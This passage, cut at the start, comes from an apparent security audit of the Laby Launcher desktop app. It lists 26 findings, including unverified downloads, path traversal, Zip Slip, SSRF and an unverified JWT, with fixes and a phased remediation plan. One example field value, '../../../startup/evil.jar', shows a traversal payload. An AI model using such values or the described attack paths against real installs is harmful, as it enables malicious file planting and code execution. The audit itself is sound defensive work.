- **Supply-chain MITM:** If an attacker can intercept the download (e.g. compromised CDN edge, TLS failure, malicious Wi-Fi), they can substitute a trojaned `.jar` without detection.
- **Path traversal:** A malicious Modrinth API response (or a forged response after JWT compromise) with `filename: "../../../startup/evil.jar"` triggers path traversal via Vuln #12.

**Fix:**
```js
yield web.download(path, downloadUrl);
const actualHash = crypto.createHash('sha512').update(fs.readFileSync(path)).digest('hex');
if (actualHash !== file.hashes.sha512) {
    fs.unlinkSync(path);
    throw new Error(`Hash mismatch for ${file.filename}`);
}
// Also sanitize filename: const safeName = path.basename(file.filename);
```

---

### High-Severity Vulnerabilities

#### Vuln #25 — Linux Auto-Update Downloads AppImage Without Signature Verification

**Location:** main `index.js`, lines ~55240–55283

```js
const downloadUrl = `https://releases.r2.labymod.net/launcher/linux/${arch}/Laby%20Launcher-latest.AppImage`;
const res = await fetch(downloadUrl);
// NO sha256 / signature verification
const fileStream = fs.createWriteStream(tempPath, { mode: 0o755 });
await pipeline(res.body, fileStream);
// ... later: fs.renameSync(tempPath, appImagePath) + app.relaunch()
```

Only HTTPS protects the download. If R2/Cloudflare is compromised, a malicious CA cert is issued, or a local TLS-intercepting proxy is installed, an attacker can ship a trojaned AppImage that auto-installs on the next restart.

**Fix:** Download a `.sha256` file in parallel and verify the hash before renaming. Better yet, use Ed25519 signature verification with a pinned public key.

---

#### Vuln #26 — `loadAndCheck` Skips Checksum Verification in Dev Mode + MD5 Used for R2 Assets

**Location:** main `index.js`, lines 10619–10638

```js
loadAndCheck(path, url, checksum, algorithm, encoding) {
    return load(path, url, (url) => web.get(url), () => {
        return new Promise((resolve, reject) => {
            if (data.default.isDevMode()) {
                resolve();  // SKIP VERIFICATION
                return;
            }
            filecontroller.checksumOf(path, !algorithm ? (url.startsWith(URLS.R2_BASE) ? 'md5' : 'sha1') : algorithm, encoding)
            // ...
        });
    });
}
```

**Issues:**
- Dev mode bypasses checksum verification entirely. If a dev build leaks (common for test builds), users get no integrity protection.
- MD5 is used for R2-hosted assets. MD5 is cryptographically broken for collision resistance — an attacker who can craft a file with the same MD5 as a legitimate asset can substitute it.

**Fix:** Always verify checksums, even in dev mode (just log warnings instead of failing). Use SHA-256 for all assets; migrate R2 manifests from MD5 to SHA-256.

---

## Summary Table

| #  | Severity | Vulnerability |
|----|----------|---------------|
| 1  | Critical | Preload exposes raw `ipcRenderer` without channel whitelist |
| 2  | Critical | `shell.openExternal` without scheme validation |
| 3  | Critical | `support:open-folder` → `shell.openPath(arbitrary)` |
| 4  | Critical | `apply-custom-icon-from-path` → path traversal + file copy |
| 5  | Critical | `instances:remove-resource` → arbitrary file deletion |
| 6  | Critical | `instances:read-screenshot` → arbitrary file read |
| 7  | Critical | `instances:delete-screenshot` → arbitrary file deletion |
| 8  | High     | `instances:copy-screenshot` → exfiltration to clipboard |
| 9  | Critical | `config:set` → persisting RCE via `javaPath` |
| 10 | Critical | `instances:update` overwrites any field without whitelist |
| 11 | High     | `instances:create` accepts arbitrary `gameDirectory` |
| 12 | Critical | `FileController.resolve/delete` lack path traversal protection |
| 13 | Critical | `extractDirectoryFromZip` → Zip Slip |
| 14 | Critical | ArticleReader: markdown without `disableParsingRawHTML` + no DOMPurify |
| 15 | High     | `openExternal` in renderer passes dangerous URL schemes |
| 16 | Critical | No CSP + no `will-navigate` handler |
| 17 | High     | Crash upload: arbitrary data, no auth/rate-limit, silent clipboard write |
| 18 | Medium   | `sanitize()` does not cover all secrets |
| 19 | Medium   | `deepMerge()` → prototype pollution |
| 20 | Medium   | `labytex://` SSRF via proxy + `bypassCSP: true` |
| 21 | Critical | `image-cache:get-texture` full SSRF + `mc:block-icon-cache-*` path traversal |
| 22 | High     | LabyRest JWTs decoded but never verified |
| 23 | High     | CurseForge API key hardcoded in client |
| 24 | High     | Modrinth install: no hash verification + path traversal via filename |
| 25 | Medium   | Linux auto-update: no signature/hash verification |
| 26 | Medium   | `loadAndCheck` skips checksum in dev mode + MD5 used for R2 assets |

---

## What Is Done Well

For balance, the following security measures are implemented correctly:

1. **Token storage encryption.** `launcher-tokens.json` is encrypted via `safeStorage` (DPAPI on Windows, Keychain on macOS, libsecret on Linux). Only plaintext in dev mode (`app.isPackaged` check).
2. **Microsoft OAuth uses PKCE** (EC P-256, no `client_secret`) — correct for desktop applications.
3. **Yggdrasil auth uses no passwords** — only `accessToken` in POST body.
4. **`child_process.spawn` (not `exec`)** for launching Java — no shell injection via arguments.
5. **Single-instance lock** correctly filters Squirrel arguments.
6. **Disabled refresh shortcuts** (`Ctrl+R`, `F5`) in packaged builds.
7. **`setWindowOpenHandler` denies new windows** (though it then passes URLs to `shell.openExternal` — see Vuln #2).
8. **Changelog and info-messages** correctly use `disableParsingRawHTML: true` in markdown.
9. **React-tooltip** is used with React children, not the `html` prop (no XSS via tooltips).
10. **`eval()` in renderer** is webpack module loader internals, not application code.
11. **Crash report sanitization** redacts the current account's `accessToken`, UUID, and username (partial — see Vuln #18).
12. **Java-related env vars** (`_JAVA_OPTIONS`, `JAVA_TOOL_OPTIONS`, etc.) are stripped from the child process env to prevent flag injection.
13. **Mercure hub URL is hardcoded** — not configurable, not injectable.
14. **Mojang access token is redacted from launch arg logs** (`--accessToken {redacted}` in log output).
15. **Vanilla asset downloads from `resources.download.minecraft.net` use SHA1 verification** against the Mojang asset index.

---

## Remediation Plan

### Phase 1 — Block release (Critical fixes, ~3–4 days)

1. Whitelist IPC channels in preload (**Vuln #1**).
2. Validate URL scheme in `shell.openExternal` (renderer + main) (**Vuln #2, #15**).
3. Remove `shell.openPath(arbitraryPath)` from `support:open-folder` (**Vuln #3**).
4. Centralized path validation (`assertPathInside(baseDir, path)`) in all IPC handlers that accept paths (**Vuln #4, #5, #6, #7, #8, #11, #12, #21**).
5. Whitelist fields in `config:set` and `instances:update` (**Vuln #9, #10**).
6. Enable `disableParsingRawHTML: true` in ArticleReader + add DOMPurify as defense-in-depth (**Vuln #14**).
7. Add CSP (meta + webRequest header) + `will-navigate` handler (**Vuln #16**).
8. Fix Zip Slip in `extractDirectoryFromZip` — check `path.resolve(destination, entryPathWithoutDirectory).startsWith(destination + path.sep)` (**Vuln #13**).
9. Validate `url` against an allowlist in `image-cache:get-texture` (**Vuln #21 SSRF**).
10. Validate `key` against a strict pattern in `mc:block-icon-cache-*` (**Vuln #21 path traversal**).

### Phase 2 — Before public release (~1 week)

11. Rate-limit + consent dialog for crash upload (**Vuln #17**).
12. Extend `sanitize()` to cover all known tokens + JWT regex (**Vuln #18**).
13. Filter `__proto__`/`constructor`/`prototype` in `deepMerge` (**Vuln #19**).
14. Remove `bypassCSP: true` from `labytex://` if possible; validate `originalUrl` against an allowlist (**Vuln #20**).
15. Verify LabyRest JWT signatures against a pinned public key (**Vuln #22**).
16. Proxy CurseForge API requests through a LabyMod backend; remove the hardcoded key from the client (**Vuln #23**).
17. Verify Modrinth file hashes after download; sanitize `filename` (**Vuln #24**).
18. Add SHA-256 signature verification for Linux auto-update (**Vuln #25**).

### Phase 3 — Defense-in-depth (ongoing)

19. Always verify checksums, even in dev mode; migrate R2 manifests from MD5 to SHA-256 (**Vuln #26**).
20. Update Electron (branch 29 is no longer the latest; accumulated Chromium CVEs).
21. Consider disabling `devTools: true` in packaged production builds.
22. Strict origin matching in CORS handler (currently `includes("laby.net")` allows `evil-laby.net`).
23. Audit the remaining IPC handlers (especially the 89 `instances:*` channels) for the patterns identified in Vuln #4–#11.
24. Fuzz-test IPC handlers with mutation payloads via `ipc.invoke` from DevTools.
25. Review `@client/js-account-manager` external package (not covered by this audit).
26. Add schema validation for all server-fetched JSON manifests (Mojang version manifest, Modrinth index, CurseForge responses, LabyMod release channel meta) to prevent prototype pollution and unexpected field usage.
27. Pin release-channel `endpoint` to an allowlist of known hosts; reject arbitrary URLs planted via `config:set`.

---

## Verification Status

All findings are based on static analysis of the production bundle. The PoCs are verified against the code paths but have not been dynamically executed against a running instance. For full confirmation, it is recommended to:

1. Launch the launcher and open DevTools (`Ctrl+Shift+T`).
2. Execute each PoC snippet in the DevTools console.
3. Verify the expected outcome (file written, process spawned, data exfiltrated, etc.).
4. Re-verify after each fix is applied.

---

## Audit Scope and Limitations

**In scope:**
- `resources/app/.webpack/main/index.js` (main process, 18 MB minified, 100 335 lines pretty-printed)
- `resources/app/.webpack/renderer/main_window/index.js` (renderer process, 17 MB minified, 123 853 lines pretty-printed)
- `resources/app/.webpack/renderer/main_window/preload.js` (preload script, 8 KB)
- `resources/app/package.json` (dependency manifest)
- `resources/app/node_modules/sql.js` (verified, no concerns)
- Native modules under `.webpack/main/native_modules/` (`keytar.node`, `register-protocol-handler.node`, `node.napi.node` — verified, no concerns)
- All 255 IPC channels between renderer and main
- All outbound HTTP endpoints (LabyMod, laby.net, Modrinth, CurseForge, Mojang, Microsoft, Hastebin, mclo.gs, Mercure)

**Out of scope (not covered by this audit):**
- `@client/js-account-manager` (external package, not inspected)
- `@web/vertexgeometryrenderer` (external package, not inspected)
- Server-side components of laby.net / labymod.net APIs (the audit only covers the client's interaction with them)
- The LabyMod mod itself (runs inside Minecraft JVM, separate trust boundary)
- Binary-level analysis of the Electron runtime (assumed trusted)
- Dynamic testing against a running instance

---

*This report covers findings identified during static analysis. Dynamic testing, external package review, and server-side audit are recommended before public release.*
